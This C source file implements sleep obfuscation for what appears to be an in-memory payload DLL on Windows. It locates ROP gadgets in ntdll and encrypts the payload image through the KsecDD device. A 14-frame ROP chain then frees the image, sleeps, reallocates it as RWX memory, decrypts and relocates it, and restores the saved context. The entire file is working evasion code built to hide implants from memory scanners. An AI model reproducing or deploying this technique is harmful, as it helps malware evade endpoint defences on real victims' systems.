#include "sleepobf.h"
#include "utils.h"

#define IOCTL_KSEC_ENCRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x03, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY CTL_CODE( FILE_DEVICE_KSEC, 0x04, METHOD_OUT_DIRECT, FILE_ANY_ACCESS )

typedef struct _ROP_STACK_FRAME {
    // pop rcx; ret --> pop rdx; ret --> pop r8; r9; r10; r11; ret
    // --> func --> next stack frame
    uint8_t* pop_rcx_gadget;
    // pop rcx; ret
    uint64_t arg_1;

    uint8_t* pop_rdx_gadget;
    // pop rdx; ret
    uint64_t arg_2;

    // pop r8; r9; r10; r11; ret
    uint8_t* pop_r8_r9_r10_r11_gadget;
    uintptr_t arg_3;
    uintptr_t arg_4;
    uintptr_t r10;
    uintptr_t r11;

    uint8_t* func_addr;

    uint8_t* add_rsp_216_gadget;    // <-- +80
    uint8_t shadow_space[32];       // <-- +88        // next stack frame will be 216 bytes from here

    uintptr_t arg_5;
    uintptr_t arg_6;
    uintptr_t arg_7;
    uintptr_t arg_8;
    uintptr_t arg_9;
    uintptr_t arg_10;

    uint8_t filler[136]; // so that next struct will be 216 bytes away from 
} ROP_STACK_FRAME;

struct {
    BOOL initialized;
    uint8_t* ret;
    uint8_t* pop_rcx;
    uint8_t* pop_rdx;
    uint8_t* pop_r8_9_10_11;
    uint8_t* add_rsp_216;
} gadgets = { 0 };

typedef struct _ROP_INFO {
    // file handle to \Device\KsecDD for encryption and decryption
    HANDLE                ksecdd_handle;
    IO_STATUS_BLOCK        ksecdd_iostat;

    void* orig_image_base;

    // --> NtFreeVirtualMemory (payload)
    void* image_base_1;
    size_t image_size_1;

    // --> NtDelayExecution
    LARGE_INTEGER interval;

    // --> NtAllocateVirtualMemory RWX (payload)
    void* new_image_base;
    size_t image_size_2;

    // --> NtAllocateVirtualMemory RWX (pointer relocation shellcode)
    void* shell_memory_block;
    size_t  shell_memory_block_size;

    size_t    shell_size;

    BOOL    ropped;
    CONTEXT saved_ctx;
    CONTEXT rop_ctx;

    void* shell_copy;
    void* payload_copy;

    // memcpy_s within ntdll.dll
    void* ntdll_memmove;

    ROP_STACK_FRAME* frames;
} ROP_INFO;

ROP_INFO* s = NULL;


/*
    this function will be loaded into a second RWX section, in the rop chain after sleep completes
    and then freed
    all just to fix a rip in the saved context

    since this is a position independent shellcode, global variables cannot be used
    so the ROP_INFO struct must be passed in
*/
void relocate_pointer(ROP_INFO* rop_info, void** p_expired_pointer) {
    // calculate rva of expired pointer
    int rva = *(uint8_t**)p_expired_pointer - rop_info->orig_image_base;
    *p_expired_pointer = (uint8_t*)rop_info->new_image_base + rva;
}

void relocate_pointer_endstub() {}

/*
    dll will be self relocating to a new location

    all pointers pointing to memory within the payload will be corrupted
    required to be marked to be relocated

    return addresses will be fixed through stack unwinding
*/

void sleep_obf(LONGLONG sleep_time) {
    if (!gadgets.initialized) {
        uint8_t* ntdll          = get_loaded_module(L"ntdll.dll");
        gadgets.ret             = pattern_scan_section(ntdll, ".text", "\xC3", "x");
        gadgets.pop_rcx         = pattern_scan_section(ntdll, ".text", "\x59\xC3", "xx");
        gadgets.pop_rdx         = pattern_scan_section(ntdll, ".text", "\x5A\xC3", "xx");
        gadgets.pop_r8_9_10_11  = pattern_scan_section(ntdll, ".text", "\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", "xxxxxxxxx");
        gadgets.add_rsp_216     = pattern_scan_section(ntdll, ".text", "\x48\x81\xC4\xD8\x00\x00\x00\xC3", "xxxxxxxx");
        gadgets.initialized     = TRUE;
    }

    if (!s) {
        s = calloc(1, sizeof(ROP_INFO));
    }

    if (!s->ksecdd_handle) {
        UNICODE_STRING    uni_str = { 0 };
        OBJECT_ATTRIBUTES ksecdd_obj = { 0 };

        RtlInitUnicodeString(&uni_str, L"\\Device\\KsecDD");
        InitializeObjectAttributes(&ksecdd_obj, &uni_str, NULL, NULL, NULL);

        NtOpenFile(&s->ksecdd_handle, SYNCHRONIZE | FILE_READ_DATA, &ksecdd_obj, &s->ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0);
    }

    s->interval.QuadPart = -sleep_time * 10000;

    if (!s->shell_copy) {
        s->shell_copy = calloc(1, s->shell_size);
    }

    if (!s->payload_copy) {
        s->payload_copy = calloc(1, g_image_size);
    }

    if (!s->ntdll_memmove) {
        uint8_t* ntdll = get_loaded_module(L"ntdll.dll");
        s->ntdll_memmove = find_export(ntdll, "memmove");
    }

    s->orig_image_base = s->image_base_1 = g_image_base;
    s->new_image_base = NULL;
    s->shell_memory_block = NULL;
    s->shell_size = (uint8_t*)relocate_pointer_endstub - (uint8_t*)relocate_pointer;
    s->shell_memory_block_size = 0x1000;
    s->image_size_1 = s->image_size_2 = g_image_size;

    s->ropped = FALSE;

    RtlCaptureContext(&s->saved_ctx);

    // cleanup function
    if (s->ropped == TRUE) {
        g_image_base = s->new_image_base;

        memset(s->payload_copy, 0, g_image_size);
        memset(s->shell_copy, 0, s->shell_size);

        s->shell_memory_block_size = 0;
        NtFreeVirtualMemory(-1, &s->shell_memory_block, &s->shell_memory_block_size, MEM_RELEASE);

        // fix return addresses
        void* return_addresses[15] = { 0 };
        int stack_depth = get_callstack(&s->saved_ctx, return_addresses, array_len(return_addresses));

        for (int i = 0; i < stack_depth; i++) {
            relocate_pointer(s, &return_addresses[i]);
        }

        return;
    }


    // save encrypted copy of the shell_relocate_pointer shellcode
    printf("s->shell_copy: 0x%p\n", s->shell_copy);
    memcpy(s->shell_copy, relocate_pointer, s->shell_size);
    NtDeviceIoControlFile(s->ksecdd_handle, NULL, NULL, NULL, &s->ksecdd_iostat, IOCTL_KSEC_ENCRYPT_MEMORY, s->shell_copy, s->shell_size, s->shell_copy, s->shell_size);

    // save encrypted copy of the payload
    printf("s->payload_copy: 0x%p\n", s->payload_copy);
    memcpy(s->payload_copy, g_image_base, g_image_size);
    NtDeviceIoControlFile(s->ksecdd_handle, NULL, NULL, NULL, &s->ksecdd_iostat, IOCTL_KSEC_ENCRYPT_MEMORY, s->payload_copy, g_image_size, s->payload_copy, g_image_size);

    int frame_count = 14;
    {
        if (!s->frames) {
            s->frames = calloc(frame_count, sizeof(ROP_STACK_FRAME));
        }

        // rop chain goes brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr !!
        ROP_STACK_FRAME* f_puts_1                            = &s->frames[0];
        ROP_STACK_FRAME* f_free                              = &s->frames[1];
        ROP_STACK_FRAME* f_sleep                             = &s->frames[2];

        ROP_STACK_FRAME* f_allocate_payload                  = &s->frames[3];
        ROP_STACK_FRAME* f_decrypt_payload                   = &s->frames[4];
        ROP_STACK_FRAME* f_load_dst_copy_decrypted_payload   = &s->frames[5]; // insert the new image base to 1st parameter of f_copy_decrypted_payload (ntdll!memcpy)
        ROP_STACK_FRAME* f_copy_decrypted_payload            = &s->frames[6];

        ROP_STACK_FRAME* f_allocate_shellcode                = &s->frames[7];
        ROP_STACK_FRAME* f_decrypt_shellcode                 = &s->frames[8];
        ROP_STACK_FRAME* f_load_dst_copy_decrypted_shellcode = &s->frames[9]; // insert the allocated shellcode space address into the 1st parameter of f_copy_decrypted_shellcode (ntdll!memcpy)
        ROP_STACK_FRAME* f_copy_decrypted_shellcode          = &s->frames[10];

        ROP_STACK_FRAME* f_load_funcaddr_update_rip_ctx      = &s->frames[11]; // insert shell_relocate_pointer to the .func_addr of f_update_rip_ctx
        ROP_STACK_FRAME* f_update_rip_ctx                    = &s->frames[12]; // call our shell_relocate_pointer function, to fix the rip in the saved context
        ROP_STACK_FRAME* f_restore                           = &s->frames[13];

        *f_puts_1 = (ROP_STACK_FRAME){ .func_addr = puts, .arg_1 = "freeing payload and sleeping..." };
                
        //
        // FREE & SLEEP
        //

        *f_free = (ROP_STACK_FRAME){
            .func_addr = NtFreeVirtualMemory,
            .arg_1 = -1,
            .arg_2 = &s->image_base_1,
            .arg_3 = &s->image_size_1,
            .arg_4 = MEM_RELEASE
        };

        *f_sleep = (ROP_STACK_FRAME){
            .func_addr = NtDelayExecution,
            .arg_1 = FALSE,
            .arg_2 = &s->interval
        };

        //
        // PAYLOAD
        //

        *f_allocate_payload = (ROP_STACK_FRAME){
            .func_addr = NtAllocateVirtualMemory,
            .arg_1 = -1,
            .arg_2 = &s->new_image_base,
            .arg_3 = 0,
            .arg_4 = &s->image_size_2,
            .arg_5 = MEM_COMMIT | MEM_RESERVE,
            .arg_6 = PAGE_EXECUTE_READWRITE
        };

        *f_decrypt_payload = (ROP_STACK_FRAME){
            .func_addr = NtDeviceIoControlFile,
            .arg_1 = s->ksecdd_handle,
            .arg_2 = NULL,
            .arg_3 = NULL,
            .arg_4 = NULL,
            .arg_5 = &s->ksecdd_iostat,
            .arg_6 = IOCTL_KSEC_DECRYPT_MEMORY,
            .arg_7 = s->payload_copy,
            .arg_8 = g_image_size,
            .arg_9 = s->payload_copy,
            .arg_10 = g_image_size
        };

        *f_load_dst_copy_decrypted_payload = (ROP_STACK_FRAME){
            .func_addr = s->ntdll_memmove,
            .arg_1 = &f_copy_decrypted_payload->arg_1,
            .arg_2 = &s->new_image_base,
            .arg_3 = sizeof(uintptr_t)
        };

        *f_copy_decrypted_payload = (ROP_STACK_FRAME){
            .func_addr = s->ntdll_memmove,
            .arg_1 = NULL, // <-- loaded during rop
            .arg_2 = s->payload_copy,
            .arg_3 = g_image_size
        };


        //
        // SHELLCODE
        //

        *f_allocate_shellcode = (ROP_STACK_FRAME){
            .func_addr = NtAllocateVirtualMemory,
            .arg_1 = -1,
            .arg_2 = &s->shell_memory_block,
            .arg_3 = 0,
            .arg_4 = &s->shell_memory_block_size,
            .arg_5 = MEM_COMMIT | MEM_RESERVE,
            .arg_6 = PAGE_EXECUTE_READWRITE
        };

        *f_decrypt_shellcode = (ROP_STACK_FRAME){
            .func_addr = NtDeviceIoControlFile,
            .arg_1 = s->ksecdd_handle,
            .arg_2 = NULL,
            .arg_3 = NULL,
            .arg_4 = NULL,
            .arg_5 = &s->ksecdd_iostat,
            .arg_6 = IOCTL_KSEC_DECRYPT_MEMORY,
            .arg_7 = s->shell_copy,
            .arg_8 = s->shell_size,
            .arg_9 = s->shell_copy,
            .arg_10 = s->shell_size
        };

        *f_load_dst_copy_decrypted_shellcode = (ROP_STACK_FRAME){
            .func_addr = s->ntdll_memmove,
            .arg_1 = &f_copy_decrypted_shellcode->arg_1,
            .arg_2 = &s->shell_memory_block,
            .arg_3 = sizeof(uintptr_t)
        };

        *f_copy_decrypted_shellcode = (ROP_STACK_FRAME){
            .func_addr = s->ntdll_memmove,
            .arg_1 = NULL, // <-- loaded during rop
            .arg_2 = s->shell_copy,
            .arg_3 = s->shell_size
        };

        //
        // FIX RIP IN SAVED CONTEXT
        //

        *f_load_funcaddr_update_rip_ctx = (ROP_STACK_FRAME){
            .func_addr = s->ntdll_memmove,
            .arg_1 = &f_update_rip_ctx->func_addr,
            .arg_2 = &s->shell_memory_block,
            .arg_3 = sizeof(uintptr_t)
        };

        *f_update_rip_ctx = (ROP_STACK_FRAME){
            .func_addr = NULL, // <-- loaded during rop, relocate_pointer shellcode,
            .arg_1 = s,
            .arg_2 = &s->rop_ctx.Rip
        };


        //
        // RESTORE
        //

        *f_restore = (ROP_STACK_FRAME){
            .func_addr = RtlRestoreContext,
            .arg_1 = &s->saved_ctx
        };
    }

    for (int i = 0; i < frame_count; i++) {
        ROP_STACK_FRAME* frame = &s->frames[i];
        frame->pop_rcx_gadget           = gadgets.pop_rcx;
        frame->pop_rdx_gadget           = gadgets.pop_rdx;
        frame->pop_r8_r9_r10_r11_gadget = gadgets.pop_r8_9_10_11;
        frame->add_rsp_216_gadget       = gadgets.add_rsp_216;
    }

    RtlCaptureContext(&s->rop_ctx);
    s->rop_ctx.Rsp = s->frames;
    s->rop_ctx.Rip = gadgets.ret;
    s->ropped      = TRUE;

    printf("s: 0x%p\n", s);
    for (int i = 0; i < frame_count; i++) {
        printf("frame[%d]: 0x%p\n", i, &s->frames[i]);
    }

    RtlRestoreContext(&s->rop_ctx, NULL);
}